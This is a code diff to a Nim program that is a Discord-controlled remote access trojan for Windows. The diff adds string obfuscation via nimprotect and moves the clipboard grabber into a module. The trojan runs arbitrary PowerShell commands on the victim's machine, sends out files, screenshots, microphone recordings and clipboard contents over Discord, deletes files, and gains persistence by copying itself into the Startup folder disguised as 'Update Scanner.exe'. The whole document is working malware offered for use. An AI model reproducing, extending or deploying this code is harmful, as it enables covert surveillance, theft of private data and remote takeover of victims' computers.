@@ -1,19 +1,27 @@
-import utils/[audio, screenshot]
+import utils/[audio, screenshot, clipboard]
 
-import dimscord, asyncdispatch, options, os, strutils, httpclient, streams, osproc
+import dimscord
+import asyncdispatch
+import options
+import os
+import strutils
+import httpclient
+import streams
+import osproc
 import winim/lean
+import nimprotect
 
-let discord = newDiscordClient("TOKEN_HERE_TOKEN_HERE_TOKEN_HERE_TOKEN_HERE")
+let discord = newDiscordClient(protectString("token here"))
 
-const helpMenu = """
+const helpMenu = protectString("""
 **:video_game: Bot Control**
 `.help` - show help menu
 `.ping` - pings all clients
 `.control <client/all>` - select target or all
 
 **:file_folder: File Management**
-`.upload <attachment>` - upload file(s) to server
-`.download <path>` - download file from target 
+`.upload <attachment>` - upload file from target
+`.download <path>` - download file to target 
 `.remove <path>` - removes file specified
 
 **:desktop: System**
@@ -25,33 +33,22 @@ const helpMenu = """
 `.screenshot` - takes a screenshot and sends 
 `.record <seconds>` - records mic for selected amount of seconds
 `.clip` - sends clipboard content
-"""
+""")
 
-var targetUsername = getenv("username")
+var targetUsername = getenv(protectString("username"))
 var selectedTarget: string
 
-proc get_clipboard*(): string =
-  defer: discard CloseClipboard()
-  if OpenClipboard(0):
-    let data = GetClipboardData(1)
-    if data != 0:
-      let text = cast[cstring](GlobalLock(data))
-      discard GlobalUnlock(data)
-      if text != NULL:
-        var sanitized_text = ($text).replace("\c", "")
-        return sanitized_text
-
 proc onReady(s: Shard, r: Ready) {.event(discord).} =
-    echo "Ready as " & targetUsername 
+    echo protectString("Ready as ") & targetUsername
 
 proc messageCreate(s: Shard, m: Message) {.event(discord).} =
     let content = m.content
     if (m.author.bot): return
 
-    if (content == ".ping"):
-        discard await discord.api.sendMessage(m.channel_id, "[+] Hello from **" & targetUsername & "**. " & $s.latency() & "ms")
+    if (content == protectString(".ping")):
+        discard await discord.api.sendMessage(m.channel_id, protectString("[+] Hello from **") & targetUsername & "**. " & $s.latency() & "ms")
 
-    if (content.startsWith(".control")):
+    if (content.startsWith(protectString(".control"))):
         var 
             messageContents = split(content, " ")
 
@@ -60,24 +57,24 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
             if (selectedTarget == "all"):
                 selectedTarget = targetUsername
             if (selectedTarget == targetUsername):
-                discard await discord.api.sendMessage(m.channel_id, "[+] Selected Target : **" & selectedTarget & "**")
+                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Selected Target : **") & selectedTarget & "**")
 
         except:
-            discard await discord.api.sendMessage(m.channel_id, "[!!] No Target Selected")
+            discard await discord.api.sendMessage(m.channel_id, protectString("[!!] No Target Selected"))
 
     if (selectedTarget == targetUsername):
-        if (content == ".help"):
+        if (content == protectString(".help")):
             discard await discord.api.sendMessage(
                 m.channel_id, 
                 embeds = @[Embed(
-                    title: some "Hello there!", 
-                    description: some helpMenu,
+                    title: some protectString("Hello there!"), 
+                    description: some protectString(helpMenu),
                     color: some 0x490070
                 )]
                 )
 
-        elif (content == ".download"):
-            discard await discord.api.sendMessage(m.channel_id, "[*] Uploading...")
+        elif (content == protectString(".download")):
+            discard await discord.api.sendMessage(m.channel_id, protectString("[*] Downloading..."))
             for attachmentIndex, attachmentValue in m.attachments:
                 var
                     filename = attachmentValue.filename
@@ -87,96 +84,96 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
                     f = newFileStream(filename, fmWrite)
                 f.write(response.body)
                 f.close()
-                discard await discord.api.sendMessage(m.channel_id, "[+] Uploaded **" & filename & "** to : **" & targetUsername & "**")
+                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Downloaded **") & filename & "** to : **" & targetUsername & "**")
         
         elif (content.startsWith(".upload")):
-            discard await discord.api.sendMessage(m.channel_id, "[*] Downloading...")
+            discard await discord.api.sendMessage(m.channel_id, "[*] Uploading...")
             try:
                 var path = split(content, " ")[1]
-                discard await discord.api.sendMessage(m.channel_id, "[+] Downloaded From : **" & targetUsername & "**", files = @[DiscordFile(name: path)])
+                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Uploaded From : **") & targetUsername & "**", files = @[DiscordFile(name: path)])
             except:
-                discard await discord.api.sendMessage(m.channel_id, "[!!] File Not Found")
+                discard await discord.api.sendMessage(m.channel_id, protectString("[!!] File Not Found"))
         
-        elif (content.startsWith(".record")):
-            discard await discord.api.sendMessage(m.channel_id, "[*] Recording...")
+        elif (content.startsWith(protectString(".record"))):
+            discard await discord.api.sendMessage(m.channel_id, protectString("[*] Recording..."))
             try:
                 var time = content[8 .. content.high]
                 record_mic(time.parseInt() + 1)
-                discard await discord.api.sendMessage(m.channel_id, "[+] Recorded mic input for : **" & time & "** seconds.", files = @[DiscordFile(name: "recording.wav")])
-                os.removeFile("recording.wav")
+                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Recorded mic input for : **") & time & "** seconds.", files = @[DiscordFile(name: "recording.wav")])
+                os.removeFile(protectString("recording.wav"))
             except:
-                discard await discord.api.sendMessage(m.channel_id, "[!!] Something went wrong! Did you input recording time?")
+                discard await discord.api.sendMessage(m.channel_id, protectString("[!!] Something went wrong! Did you input recording time?"))
         
-        elif (content == ".screenshot"):
-            discard await discord.api.sendMessage(m.channel_id, "[*] Taking screenshot...")
+        elif (content == protectString(".screenshot")):
+            discard await discord.api.sendMessage(m.channel_id, protectString("[*] Taking screenshot..."))
             try:
                 get_screenshot()
-                discard await discord.api.sendMessage(m.channel_id, "[+] Screenshot from : **" & targetUsername & "**.", files = @[DiscordFile(name: "screenshot.png")])
-                os.removeFile("screenshot.png")
+                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Screenshot from : **") & targetUsername & "**.", files = @[DiscordFile(name: "screenshot.png")])
+                os.removeFile(protectString("screenshot.png"))
             except:
-                discard await discord.api.sendMessage(m.channel_id, "[!!] Something went wrong!")
+                discard await discord.api.sendMessage(m.channel_id, protectString("[!!] Something went wrong!"))
         
-        elif (content == ".persist"):
-            discard await discord.api.sendMessage(m.channel_id, "[*] Attempting to establish persistence...")
+        elif (content == protectString(".persist")):
+            discard await discord.api.sendMessage(m.channel_id, protectString("[*] Attempting to establish persistence..."))
             try:
-                copyfile(getAppFilename(), r"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Update Scanner.exe")
-                discard await discord.api.sendMessage(m.channel_id, "[*] Persistence established!")
+                copyfile(getAppFilename(), protectString(r"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Update Scanner.exe"))
+                discard await discord.api.sendMessage(m.channel_id, protectString("[*] Persistence established!"))
             except CatchableError:
-                discard await discord.api.sendMessage(m.channel_id, "[!!] Failed to establish persistence!")
+                discard await discord.api.sendMessage(m.channel_id, protectString("[!!] Failed to establish persistence!"))
 
-        elif (content == ".clip"):
-            discard await discord.api.sendMessage(m.channel_id, "[*] Getting clipboard...")
+        elif (content == protectString(".clip")):
+            discard await discord.api.sendMessage(m.channel_id, protectString("[*] Getting clipboard..."))
             try:
                 var 
                   content = get_clipboard()
-                  f = newFileStream("clipboard.txt", fmWrite)
+                  f = newFileStream(protectString("clipboard.txt"), fmWrite)
                 f.write(content)
                 f.close()
-                discard await discord.api.sendMessage(m.channel_id, "[+] Clipboard from : **" & targetUsername & "**.", files = @[DiscordFile(name: "clipboard.txt")])
-                os.removeFile("clipboard.txt")
+                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Clipboard from : **") & targetUsername & "**.", files = @[DiscordFile(name: "clipboard.txt")])
+                os.removeFile(protectString("clipboard.txt"))
             except:
-                discard await discord.api.sendMessage(m.channel_id, "[!!] Something went wrong!")
+                discard await discord.api.sendMessage(m.channel_id, protectString("[!!] Something went wrong!"))
 
-        elif (content.startswith(".shell")):
-            discard await discord.api.sendMessage(m.channel_id, "Running command...")
+        elif (content.startswith(protectString(".shell"))):
+            discard await discord.api.sendMessage(m.channel_id, protectString("Running command..."))
             var 
                 command = content[6 .. content.high]
-                outp = execProcess("powershell.exe /c " & command , options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
+                outp = execProcess(protectString("powershell.exe /c ") & command , options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
             
             if outp.len() < 2000:
                 try:
                     discard await discord.api.sendMessage(m.channel_id, "```" & outp & "```")
                 except:
-                    discard await discord.api.sendMessage(m.channel_id, "Ran : `" & command & "` on : **" & targetUsername & "** but no output was given.")
+                    discard await discord.api.sendMessage(m.channel_id, protectString("Ran : `") & command & "` on : **" & targetUsername & "** but no output was given.")
             else:
-                var f = newFileStream("output.txt", fmWrite)
+                var f = newFileStream(protectString("output.txt"), fmWrite)
                 f.write(outp)
                 f.close()
-                discard await discord.api.sendMessage(m.channel_id, "[+] Output from : **" & targetUsername & "**.", files = @[DiscordFile(name: "output.txt")])
-                os.removeFile("output.txt")
+                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Output from : **") & targetUsername & "**.", files = @[DiscordFile(name: "output.txt")])
+                os.removeFile(protectString("output.txt"))
         
-        elif (content == ".ip"):
+        elif (content == protectString(".ip")):
             var
               client = newHttpClient()
-              ip_response = client.get("https://ipinfo.io/json")
+              ip_response = client.get(protectString("https://ipinfo.io/json"))
               ipinfo = ip_response.body
             
             discard await discord.api.sendMessage(
                 m.channel_id, 
                 embeds = @[Embed(
-                    title: some ":satellite: IP Info", 
+                    title: some protectString(":satellite: IP Info"), 
                     description: some "```" & ipinfo & "```",
                     color: some 0x490070
                 )]
                 )
 
-        elif (content.startsWith(".remove")):
-            discard await discord.api.sendMessage(m.channel_id, "[*] Removing...")
+        elif (content.startsWith(protectString(".remove"))):
+            discard await discord.api.sendMessage(m.channel_id, protectString("[*] Removing..."))
             try:
                 var path = split(content, " ")[1]
                 os.removeFile(path)
-                discard await discord.api.sendMessage(m.channel_id, "[+] Removed file **" & path & "** from **" & targetUsername & "**")
+                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Removed file **") & path & "** from **" & targetUsername & "**")
             except:
-                discard await discord.api.sendMessage(m.channel_id, "[!!] File Not Found")
+                discard await discord.api.sendMessage(m.channel_id, protectString("[!!] File Not Found"))
 
 waitFor discord.startSession()
